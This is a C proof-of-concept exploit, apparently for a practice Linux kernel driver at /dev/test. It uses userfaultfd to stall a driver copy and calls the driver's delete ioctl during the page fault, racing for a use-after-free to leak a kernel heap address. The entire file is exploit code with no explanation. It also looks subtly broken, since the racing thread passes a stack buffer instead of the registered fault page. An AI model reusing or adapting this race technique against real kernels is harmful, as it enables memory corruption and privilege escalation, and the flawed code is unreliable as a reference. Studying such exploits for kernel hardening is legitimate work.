#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <poll.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/userfaultfd.h>
#define _GNU_SOURCE
#include <linux/sched.h>
#include <sys/wait.h>
#include <pthread.h>

#define TEST_READ 0x23333
#define TEST_WRITE 0x23334
#define TEST_DELETE 0x23335

struct request {
	size_t length;
	void *buf;
};

int userfaultfd(int flags)
{
	return syscall(SYS_userfaultfd, flags);
}

int prepareUFD(void *pages, size_t memsize) {
	int fd = 0;
	if ((fd = userfaultfd(O_NONBLOCK)) == -1) {
		perror("userfaultfd");
		exit(-1);
	}

	struct uffdio_api api = { .api = UFFD_API };
	if (ioctl(fd, UFFDIO_API, &api)) {
		perror("ioctl(fd, UFFDIO_API, ...) failed");
		exit(-1);
	}

	if (api.api != UFFD_API) {
		perror("uffd_api");
		exit(-1);
	}

	/* mmap some pages, set them up with the userfaultfd. */
	struct uffdio_register reg = {
		.mode = UFFDIO_REGISTER_MODE_MISSING,
		.range = {
			.start = (long) pages,
			.len = memsize
		}
	};
	if (ioctl(fd, UFFDIO_REGISTER,  &reg)) {
		perror("ioctl(fd, UFFDIO_REGISTER, ...) failed");
		exit(-1);
	}
	if (reg.ioctls != UFFD_API_RANGE_IOCTLS) {
		perror("unexpected UFFD ioctls");
		exit(-1);
	}
	return fd;
}

void test_delete() {
	struct request req;
	int fd = open("/dev/test", O_RDONLY);
	if (fd == -1) {
		perror("open");
		exit(-1);
	}

	ioctl(fd, TEST_DELETE, &req);
	close(fd);
}

void test_read(void *buf, size_t length) {
	struct request req;
	req.buf = buf;
	req.length = length;
	int fd = open("/dev/test", O_RDONLY);
	if (fd == -1) {
		perror("open");
		exit(-1);
	}

	ioctl(fd, TEST_READ, &req);
	close(fd);
}

void test_write(void *buf, size_t length) {
	struct request req;
	req.buf = buf;
	req.length = length;
	int fd = open("/dev/test", O_RDONLY);
	if (fd == -1) {
		perror("open");
		exit(-1);
	}

	ioctl(fd, TEST_WRITE, &req);
	close(fd);
}

void handlePageFault(int ufd, void *faultpg, void *copyData, size_t copyLen,  void (*handler)(void)) {
	struct pollfd evt = { .fd = ufd, .events = POLLIN };
	while (poll(&evt, 1, 10) > 0) {
		/* unexpected poll events */
		if (evt.revents & POLLERR) {
			perror("poll");
			exit(-1);
		} else if (evt.revents & POLLHUP) {
			perror("pollhup");
			exit(-1);
		}
		struct uffd_msg fault_msg = {0};
		if (read(ufd, &fault_msg, sizeof(fault_msg)) != sizeof(fault_msg)) {
			perror("read");
			exit(-1);
		}
		char *place = (char *)fault_msg.arg.pagefault.address;
		if (place == faultpg) {
			printf("[+] got page fault at address %p, nice!\n", place);
			/* execute routine */
			handler();
			/* release by copying some data to faulting address */
			struct uffdio_copy copy = {
				.dst = (long) place,
				.src = (long) copyData,
				.len = copyLen
			};
			if (ioctl(ufd, UFFDIO_COPY, &copy) < 0) {
				perror("ioctl(UFFDIO_COPY)");
				exit(-1);
			}
			break;
		}
	}	
}

void func1() {
	char buf[0x10];
	printf("func1\n");
	test_write(buf, sizeof(buf));
	printf("now the data: ");
	write(1, buf, sizeof(buf));
}

void handle_func1() {
	printf("handler for 1\n");
	test_delete();
}


int main(){
	int ufd;
	void *faultpg;
	char write_buf[0x1000];
	pthread_t tid;

	if ((faultpg = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)) == MAP_FAILED) {
		perror("mmap");
		exit(-1);
	}

	/* initialize */
	memset(write_buf, 0, sizeof(write_buf));
	test_read(write_buf, 0x100);

	ufd = prepareUFD(faultpg, 0x1000);
	
	/* first race to leak a heap address */
	if (pthread_create(&tid, NULL, func1, NULL)) {
		perror("pthread_create");
		exit(-1);
	}
	/* handle page fault */
	handlePageFault(ufd, faultpg, write_buf, sizeof(write_buf), handle_func1);
	pthread_join(tid, NULL);

	return 0;
}
